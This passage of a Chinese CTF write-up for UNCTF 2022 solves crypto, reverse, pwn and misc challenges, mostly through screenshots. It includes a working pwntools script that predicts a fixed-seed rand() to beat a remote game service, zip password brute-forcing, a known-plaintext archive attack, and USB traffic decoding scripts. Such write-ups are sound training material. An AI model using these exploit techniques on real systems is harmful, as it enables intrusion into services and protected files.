src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120115244514.png"></p><p> 然后把顺序换一下</p><h2 id="Multi-table-西南科技大学"><a href="#Multi-table-西南科技大学" class="headerlink" title="Multi table-西南科技大学"></a>Multi table-西南科技大学</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116001126488.png"></p><h2 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h2><p> 照着base64表一个个右移19位</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120114139652.png"></p><h2 id="easy-RSA-中国人民公安大学"><a href="#easy-RSA-中国人民公安大学" class="headerlink" title="easy_RSA-中国人民公安大学"></a>easy_RSA-中国人民公安大学</h2><p>直接用lazzaro佬的p高位泄露脚本sagemath一把梭</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps27.jpg"> </p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps28.jpg"> </p><h2 id="ezxor-浙江师范大学"><a href="#ezxor-浙江师范大学" class="headerlink" title="ezxor-浙江师范大学"></a>ezxor-浙江师范大学</h2><p>网上找一个多次一密脚本</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps29.jpg"> </p><p>用得到的结果去网上搜索相似的文章得到明文，第一段明文和第一段密文异或得到flag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps30.jpg"> </p><h2 id="babyRSA-广东海洋大学"><a href="#babyRSA-广东海洋大学" class="headerlink" title="babyRSA-广东海洋大学"></a>babyRSA-广东海洋大学</h2><p>直接用lazzaro佬的m高位泄露脚本sagemath一把梭</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116111931343.png"></p><h2 id="今晚吃什么-金陵科技学院"><a href="#今晚吃什么-金陵科技学院" class="headerlink" title="今晚吃什么-金陵科技学院"></a>今晚吃什么-金陵科技学院</h2><p>把10000转化成A，00000转化成B</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116124557353.png"></p><p>在线解密培根密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116124628450.png"></p><h2 id="ezRSA-广东海洋大学"><a href="#ezRSA-广东海洋大学" class="headerlink" title="ezRSA-广东海洋大学"></a>ezRSA-广东海洋大学</h2><p><a href="http://www.factordb.com/%E5%9C%A8%E7%BA%BF%E5%88%86%E8%A7%A3n">http://www.factordb.com/在线分解n</a></p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116133920994.png"></p><p>然后直接用风二西佬的n是p的r次方脚本一把梭</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116133934005.png"></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE:"></a>REVERSE:</h1><h2 id="whereisyourkey-广东海洋大学"><a href="#whereisyourkey-广东海洋大学" class="headerlink" title="whereisyourkey-广东海洋大学"></a>whereisyourkey-广东海洋大学</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps31.jpg"> </p><p>对数据处理后转ascii得到key：yesiamflag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps32.jpg"> </p><h2 id="ezzzzre-广东海洋大学"><a href="#ezzzzre-广东海洋大学" class="headerlink" title="ezzzzre-广东海洋大学"></a>ezzzzre-广东海洋大学</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps33.jpg"> </p><p>对数据处理后转ascii得到key：KESSYAcG</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps34.jpg"> </p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN:"></a>PWN:</h1><h2 id="welcomeUNCTF2022-云南警官学院"><a href="#welcomeUNCTF2022-云南警官学院" class="headerlink" title="welcomeUNCTF2022-云南警官学院"></a>welcomeUNCTF2022-云南警官学院</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps35.jpg"> </p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps36.jpg"> </p><h2 id="石头剪刀布-西华大学："><a href="#石头剪刀布-西华大学：" class="headerlink" title="石头剪刀布-西华大学："></a>石头剪刀布-西华大学：</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120143316923.png"></p><p>当对方输入1时，我们输入0；当对方输入2时，我们输入1；当对方输入0时，我们输入2。</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120145110829.png"></p><p>在网上找个srand()&#x2F;rand()漏洞的解题脚本照着改一下得到：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span> p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node.yuzhian.com.cn"</span><span class="token punctuation">,</span><span class="token number">36605</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">0</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>    <span class="token keyword">if</span> v1 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">elif</span> v1 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">elif</span> v1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token number">2</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221120145710990.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h1><h2 id="magic-word-西南科技大学"><a href="#magic-word-西南科技大学" class="headerlink" title="magic_word-西南科技大学"></a>magic_word-西南科技大学</h2><p>复制全文到零宽度字符隐写</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221115192248275.png"></p><h2 id="syslog-浙江师范大学"><a href="#syslog-浙江师范大学" class="headerlink" title="syslog-浙江师范大学"></a>syslog-浙江师范大学</h2><p>使用winrar修复压缩包之后，发现有一个被加密的flag文件，尝试爆破没爆破出来，用winhex打开syslog文件，搜索password</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps37.jpg"> </p><p>然后base64解码得到压缩包密码，打开flag文件</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221118152205713.png"></p><h2 id="巨鱼-河南理工大学"><a href="#巨鱼-河南理工大学" class="headerlink" title="巨鱼-河南理工大学"></a>巨鱼-河南理工大学</h2><p>修改fish.png图片高度，得到压缩包密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221115191835412.png"></p><p>打开压缩包，发现文件头错误</p><p>于是修复压缩包，然后得到一张图片和一个ppt文件，搜索图片中化学式，发现有多种名称，分别尝试，最终ppt密码为666，</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221115192053039.png"></p><h2 id="我小心海也绝非鳝类-中国计量大学现代科技学院"><a href="#我小心海也绝非鳝类-中国计量大学现代科技学院" class="headerlink" title="我小心海也绝非鳝类-中国计量大学现代科技学院"></a>我小心海也绝非鳝类-中国计量大学现代科技学院</h2><p>Winhex打开图片，发现尾部有一串base64字符，解码后提示easylsb，图片中有一串字符，直接lsb加密隐写不行，于是basecrack尝试解码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps38.jpg"> </p><p>解码得到flaginmd5，然后lsb加密隐写，得到</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps39.jpg"> </p><p>根据密码flaginmd5，把字符串32个为一组，分成21组，分别md5解密得到flag</p><h2 id="找得到我吗-闽南师范大学"><a href="#找得到我吗-闽南师范大学" class="headerlink" title="找得到我吗-闽南师范大学"></a>找得到我吗-闽南师范大学</h2><p>改后缀名为zip打开document文件</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/wps40.jpg"> </p><p>得到flag：</p><p>flag{You_find_me!}</p><h2 id="zhiyin-中国人民公安大学"><a href="#zhiyin-中国人民公安大学" class="headerlink" title="zhiyin-中国人民公安大学"></a>zhiyin-中国人民公安大学</h2><p>winhex打开zhiyin.png，文件尾发现摩斯密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116083809851.png"></p><p>解码得到</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221118153854419.png"></p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116083947835.png"></p><p>可以看出lanqiu.png是逆转的jpg图片</p><p>python逆转nanqiu.png</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20221116083707763.png"></p><p>得到</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116084030144.png"></p><p>因为密码不确定，于是把几种可能的密码写一个字典</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116084108201.png"></p><p>最终得到flag：</p><p>flag{M1sic_1s_greAt}</p><h2 id="清和fan-江西警察学院"><a href="#清和fan-江西警察学院" class="headerlink" title="清和fan-江西警察学院"></a>清和fan-江西警察学院</h2><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116085104777.png"></p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116085125681.png"></p><p>得到密码836885_2022&#x2F;05&#x2F;20</p><p>打开压缩包，得到一张图片和另一个加密的压缩包，尝试各种图片中动漫人物的名字没有解密出来，于是尝试lsb隐写得到密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116092235574.png"></p><p>用mmsstv听音频</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116123216640.png"></p><p>得到密码，打开压缩包，里面一个txt文件，是零宽度字符隐写</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116123600234.png"></p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116123626532.png"></p><h2 id="芝麻开门-广东海洋大学"><a href="#芝麻开门-广东海洋大学" class="headerlink" title="芝麻开门-广东海洋大学"></a>芝麻开门-广东海洋大学</h2><p>winhex打开压缩包，发现base64字符</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116143710702.png"></p><p>base64解码得到密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116143816080.png"></p><p>用密码尝试lsb加密隐写</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116143750010.png"></p><p>得到flag</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116143642654.png"></p><h2 id="In-the-Morse-Garden-陆军工程大学"><a href="#In-the-Morse-Garden-陆军工程大学" class="headerlink" title="In_the_Morse_Garden-陆军工程大学"></a>In_the_Morse_Garden-陆军工程大学</h2><p>用pdf编辑器打开pdf文件，移开图片，看到base字符</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116145801925.png"></p><p>base解码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116145820671.png"></p><p>把依古比古替换成.玛卡巴卡替换成-，然后摩斯密码解密</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116145915027.png"></p><p>得到flag：</p><p>UNCTF{WAN_AN_MAKA_BAKAAAAA!}</p><h2 id="剥茧抽丝-内蒙古警察职业学院"><a href="#剥茧抽丝-内蒙古警察职业学院" class="headerlink" title="剥茧抽丝-内蒙古警察职业学院"></a>剥茧抽丝-内蒙古警察职业学院</h2><p>010打开压缩包，在文件尾端发现密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116214738335.png"></p><p>解压后，在txt文件里发现零宽度字符隐写，尝试解密，发现是乱码，想到明文攻击，于是删掉零宽度字符，重新新建一个txt文件，发现和压缩包里的txt文件大小相同，CRC值也相同，于是用ARCHPR进行明文攻击</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221116214856294.png"></p><p>尝试爆破十几个小时没出来，想到零宽度字符隐写还有二进制格式</p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a></p><p>在在线网站提取二进制数据，得到密码</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221118080818388.png"></p><p>然后用密码打开flag.zip，得到flag</p><p>unctf{d4a3a242-cd32-4dd5-bac6-84bdf13f527f}</p><h2 id="CatchJerry-华中科技大学"><a href="#CatchJerry-华中科技大学" class="headerlink" title="CatchJerry-华中科技大学"></a>CatchJerry-华中科技大学</h2><p>首先用tshark提取键盘和鼠标流量</p><pre><code>tshark.exe -r CatchJerry.pcap -T fields -e usbhid.data &gt; usbdata.txt</code></pre><p>得到的数据是没有冒号的，可以去网上找一个转化成带冒号的数据的脚本</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221117170958166.png"></p><pre class=" language-python"><code class="language-python">键盘流量转换脚本mappings <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x04</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span>  <span class="token number">0x05</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span>  <span class="token number">0x06</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span>  <span class="token number">0x0B</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span>  <span class="token number">0x0D</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span>  <span class="token number">0x13</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span>  <span class="token number">0x23</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">:</span><span class="token string">"[DEL]"</span><span class="token punctuation">,</span>  <span class="token number">0X2B</span><span class="token punctuation">:</span><span class="token string">"    "</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">:</span><span class="token string">" "</span><span class="token punctuation">,</span>  <span class="token number">0x2D</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span>  <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span>  <span class="token number">0x31</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span>  <span class="token number">0x34</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span>  <span class="token number">0x37</span><span class="token punctuation">:</span><span class="token string">"."</span> <span class="token punctuation">}</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token operator">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span><span class="token punctuation">:</span>         <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span>int<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 00:00:xx:....</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> mappings<span class="token punctuation">:</span>        output <span class="token operator">+=</span> mappings<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :n'</span> <span class="token operator">+</span> output<span class="token punctuation">)</span></code></pre><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221117171417528.png"></p><pre class=" language-python"><code class="language-python">鼠标流量转换脚本nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'xy.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>posx <span class="token operator">=</span> <span class="token number">0</span>posy <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    x <span class="token operator">=</span> int<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> int<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        x <span class="token operator">-=</span> <span class="token number">256</span>    <span class="token keyword">if</span> y <span class="token operator">></span> <span class="token 